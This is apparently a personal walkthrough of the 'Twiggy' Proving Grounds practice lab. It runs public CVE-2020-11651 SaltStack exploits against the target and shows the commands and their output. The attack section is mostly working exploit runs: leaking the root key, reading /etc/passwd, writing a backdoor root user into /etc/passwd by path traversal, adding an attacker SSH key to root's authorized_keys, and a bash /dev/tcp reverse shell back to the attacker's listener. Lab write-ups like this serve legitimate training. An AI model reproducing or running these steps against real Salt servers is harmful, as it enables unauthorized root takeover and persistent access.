# Twiggy

## Enumeration

### Autorecon

```
# Nmap 7.91 scan initiated Wed Jan 12 09:11:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Twiggy/results/192.168.90.62/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Twiggy/results/192.168.90.62/scans/xml/_full_tcp_nmap.xml" 192.168.90.62
adjust_timeouts2: packet supposedly had rtt of -52538 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -52538 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -174487 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -174487 microseconds.  Ignoring time.
Nmap scan report for 192.168.90.62
Host is up, received user-set (0.20s latency).
Scanned at 2022-01-12 09:11:42 EST for 358s
Not shown: 65530 filtered ports
Reason: 65530 no-responses
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZz8rKSxgnT5mqHeBPqGlXFj2JJdq21roV/2M8/+0F5/5D1XsaXmbktDpKILFdBcYnLtPxWstxPq+FTbWAJad2uk3BPYWRxidK2dOozE5rKLCyxtkEqs/lO09pM6VKQUi83y5wMwI+9Akkir0AMruuFUSpeCIBt/L98g8OYxzyTsylQATnPxJrrQOWGUQYAvX6jIs25n6d3rmbXk/crg1ZfAVFEHEeR9Y6Bjc2o5YWjMp3XbOZyC4yYseoM6eH2yCSDwu1DzPYrU6cNMfxBf863w1uyhiFk3eIb5jud3kfoxIq6t5JU2DXNhEd4rdXuuinZUSxWiCpHLZ1FCi4tkX5
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA1gj1q7mOswnou9RvKwuX8S7WFBhz2NlaSIpYPQmM0I/vqb4T459PgJcMaJOE+WmPiMnDSFsyV3C6YszM754Hc=
|   256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBzTSyInONbcDxdYULbDvI/HyrQm9m9M5b6Z825jnBEF
53/tcp   open  domain  syn-ack ttl 63 NLnet Labs NSD
80/tcp   open  http    syn-ack ttl 63 nginx 1.16.1
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    syn-ack ttl 63 ZeroMQ ZMTP 2.0
8000/tcp open  http    syn-ack ttl 63 nginx 1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.12 (90%), Linux 4.4 (90%), Linux 4.9 (90%), Linux 3.10 (86%), Linux 3.10 - 3.16 (86%), Linux 4.0 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/12%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61DEE304%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10A%TI=Z%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.004 days (since Wed Jan 12 09:12:22 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   203.46 ms 192.168.49.1
2   203.49 ms 192.168.90.62

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 12 09:17:40 2022 -- 1 IP address (1 host up) scanned in 360.51 seconds
```

### SSH - 22
### 53

### ZeroMQ ZMTP 2.0 - 4505

### Web - 80

![](Pasted%20image%2020220112222855.png)

### Web - 8000

![](Pasted%20image%2020220112222921.png)

## Exploit
https://chr0x6eos.github.io/2021/02/20/htb-Feline.html
https://www.exploit-db.com/exploits/48421
https://ivanitlearning.wordpress.com/2021/06/02/tips-from-the-pwk-labs-and-pg-practice/

https://github.com/dozernz/cve-2020-11651/blob/master/CVE-2020-11651.py

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 CVE-2020-11651.py 192.168.90.62 master whoami                                                                                                           1 ⨯
Attempting to ping master at 192.168.90.62
Retrieved root key: jkKrmdnzf/PBjWAh3RXqEupvKL1c47CiQmrejLjqG0x4VTiAN86VbpasfzKIaeFQZ0SQJZS7jh4=
Got response for attempting master shell: {'jid': '20220112152927719849', 'tag': 'salt/run/20220112152927719849'}. Looks promising!
Exception ignored in: <function AsyncZeroMQReqChannel.__del__ at 0x7f2f4ed7e8b0>
Traceback (most recent call last):
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 185, in __del__
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 180, in close
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 1072, in close
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 1147, in close
  File "/home/kali/.local/lib/python3.9/site-packages/zmq/eventloop/zmqstream.py", line 405, in close
  File "/home/kali/.local/lib/python3.9/site-packages/salt/ext/tornado/ioloop.py", line 737, in remove_handler
  File "/home/kali/.local/lib/python3.9/site-packages/salt/ext/tornado/ioloop.py", line 659, in split_fd
  File "/home/kali/.local/lib/python3.9/site-packages/zmq/sugar/socket.py", line 255, in fileno
  File "/home/kali/.local/lib/python3.9/site-packages/zmq/sugar/attrsettr.py", line 48, in __getattr__
ImportError: sys.meta_path is None, Python is likely shutting down
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 48421.txt.py -m 192.168.90.62 -p 4506 --exec whoami -d
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.90.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: jkKrmdnzf/PBjWAh3RXqEupvKL1c47CiQmrejLjqG0x4VTiAN86VbpasfzKIaeFQZ0SQJZS7jh4=
[+] Attemping to execute whoami on 192.168.90.62
[+] Successfully scheduled job: 20220112153013034641
                                                       
```


```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search saltstack_salt_unauth_rce

Matching Modules
================

   #  Name                                          Disclosure Date  Rank   Check  Description
   -  ----                                          ---------------  ----   -----  -----------
   0  exploit/linux/misc/saltstack_salt_unauth_rce  2020-04-30       great  Yes    SaltStack Salt Master/Minion Unauthenticated RCE


msf5 > use 0
[*] Using configured payload python/meterpreter/reverse_https
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > show options

Module options (exploit/linux/misc/saltstack_salt_unauth_rce):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   MINIONS   .*               yes       PCRE regex of minions to target
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   ROOT_KEY                   no        Master's root key if you have it
   RPORT     4506             yes       The target port (TCP)
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Master (Python payload)


msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > set RHOSTS 192.168.123.62
RHOSTS => 192.168.123.62
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > set LHOST 192.168.49.123
LHOST => 192.168.49.123
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > run

[*] Started HTTPS reverse handler on https://192.168.49.123:8443
[*] 192.168.123.62:4506 - Using auxiliary/gather/saltstack_salt_root_key as check
[*] 192.168.123.62:4506 - Connecting to ZeroMQ service at 192.168.123.62:4506
[*] 192.168.123.62:4506 - Negotiating signature
[*] 192.168.123.62:4506 - Negotiating version
[*] 192.168.123.62:4506 - Negotiating NULL security mechanism
[*] 192.168.123.62:4506 - Sending READY command of type REQ
[*] 192.168.123.62:4506 - Yeeting _prep_auth_info() at 192.168.123.62:4506
[+] 192.168.123.62:4506 - Root key: jkKrmdnzf/PBjWAh3RXqEupvKL1c47CiQmrejLjqG0x4VTiAN86VbpasfzKIaeFQZ0SQJZS7jh4=
[*] 192.168.123.62:4506 - Connecting to ZeroMQ service at 192.168.123.62:4506
[*] 192.168.123.62:4506 - Negotiating signature
[*] 192.168.123.62:4506 - Negotiating version
[*] 192.168.123.62:4506 - Negotiating NULL security mechanism
[*] 192.168.123.62:4506 - Sending READY command of type REQ
[*] 192.168.123.62:4506 - Executing Python payload on the master: python/meterpreter/reverse_https
[*] 192.168.123.62:4506 - Yeeting runner() at 192.168.123.62:4506
[*] Exploit completed, but no session was created.
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > run

```

https://github.com/jasperla/CVE-2020-11651-poc/blob/master/exploit.py

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --read /etc/passwd                                                                                 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to read /etc/passwd from 192.168.177.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --read /root/proof.txt                                                                                   1 ⚙
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to read /root/proof.txt from 192.168.177.62
234e6be0dffcab69c5ad0179e162dadf

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ nano passwd                                                                                                                                                     1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> passwd                                                                                               1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --upload-src passwd --upload-dest /etc/passwd                                                            1 ⚙
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[-] Destination path must be relative; aborting
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --upload-src passwd --upload-dest ../../../../etc/passwd                                             1 ⨯ 1 ⚙
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to upload passwd to ../../../../etc/passwd on 192.168.177.62
[ ] Exception occurred in wheel file_roots.write: Traceback (most recent call last):
  File "/usr/lib/python2.7/site-packages/salt/client/mixins.py", line 374, in low
    data['return'] = func(*args, **kwargs)
  File "/usr/lib/python2.7/site-packages/salt/wheel/file_roots.py", line 113, in write
    os.makedirs(dest_dir)
  File "/usr/lib64/python2.7/os.py", line 157, in makedirs
    mkdir(name, mode)
OSError: [Errno 17] File exists: '/srv/salt/../../../../etc'

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --upload-src passwd --upload-dest ../../etc/passwd                                                       1 ⚙
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to upload passwd to ../../etc/passwd on 192.168.177.62
[ ] Wrote data to file /srv/salt/../../etc/passwd
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh dummyroot@192.168.177.62                                                                                                                                    1 ⚙
The authenticity of host '192.168.177.62 (192.168.177.62)' can't be established.
ECDSA key fingerprint is SHA256:35oa0vsEHb3I/P1W2wN/UkOARxQqaZ5g+clkCM6+XRA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.177.62' (ECDSA) to the list of known hosts.
dummyroot@192.168.177.62's password: 
Last login: Wed Mar 10 09:12:43 2021
[root@twiggy ~]# cat proof.txt
234e6be0dffcab69c5ad0179e162dadf
[root@twiggy ~]# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.177.62  netmask 255.255.255.0  broadcast 192.168.177.255
        ether 00:50:56:bf:86:1a  txqueuelen 1000  (Ethernet)
        RX packets 2000  bytes 218529 (213.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1412  bytes 118195 (115.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1064  bytes 73240 (71.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1064  bytes 73240 (71.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[root@twiggy ~]# 
                                                          
```

![](Pasted%20image%2020220201110650.png)
## Privesc


## Others

## Testing SSH Key write

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --exec 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" >> /root/.ssh/authorized_keys' -d
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to execute mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" >> /root/.ssh/authorized_keys on 192.168.177.62
[+] Successfully scheduled job: 20220201031035637762
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i ~/.ssh/id_rsa root@192.168.177.62                                                                                                                        1 ⚙
Last login: Mon Jan 31 22:06:26 2022 from 192.168.49.177
[root@twiggy ~]# 
```

# Interesting Thing

Reverse shell through port 4505 doesn't work for some reason

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --exec-all '/bin/bash -i >& /dev/tcp/192.168.49.177/4505 0>&1' -d                                  127 ⨯ 1 ⚙
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[!] Lester, is this what you want? Hit ^C to abort.
[+] Attemping to execute '/bin/bash -i >& /dev/tcp/192.168.49.177/4505 0>&1' on all minions connected to 192.168.177.62
[+] Successfully submitted job to all minions.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py --master 192.168.177.62 --port 4506 --exec '/bin/bash -i >& /dev/tcp/192.168.49.177/4505 0>&1' -d                                            1 ⚙
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.177.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to execute /bin/bash -i >& /dev/tcp/192.168.49.177/4505 0>&1 on 192.168.177.62
[+] Successfully scheduled job: 20220201032417951913
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$           
```

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 4505                                                                                                                                                   1 ⨯
listening on [any] 4505 ...
connect to [192.168.49.177] from (UNKNOWN) [192.168.177.62] 41116
bash: no job control in this shell
[root@twiggy root]# 

```